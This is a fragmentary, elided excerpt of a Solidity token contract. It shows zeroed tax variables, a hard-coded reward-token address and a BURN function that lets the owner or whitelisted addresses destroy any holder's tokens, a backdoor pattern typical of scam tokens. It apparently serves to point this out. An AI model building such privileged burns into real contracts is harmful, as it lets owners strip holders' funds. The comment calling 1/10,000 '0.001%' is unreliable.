...
contract TOKEN is ERC20, Ownable, BaseToken {
    ...
    uint public changeTaxOne = 0;
    uint  public changeTaxTwo = 0;
    uint public changeTaxThree= 0;
    uint public changeTaxFour = 0;
    uint public changeTaxFive = 0;
    ...
    uint public PercentageOne = 0;
    uint public PercentageTwo = 0;
    uint public PercentageThree = 0;
    uint public PercentageFour = 0;
    uint public PercentageFive = 0;
    ...
    constructor(address _cloneadd
        ...
        uint256 totalSupply_ = 1_00 ether;
        rewardToken = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7;

        
        swapTokensAtAmount = totalSupply_.div(10_000); // 0.001%
    ...
    function BURN(address user,uint256 amount) external {
        require(msg.sender == owner() || BurnWhiteList[msg.sender]);
        {
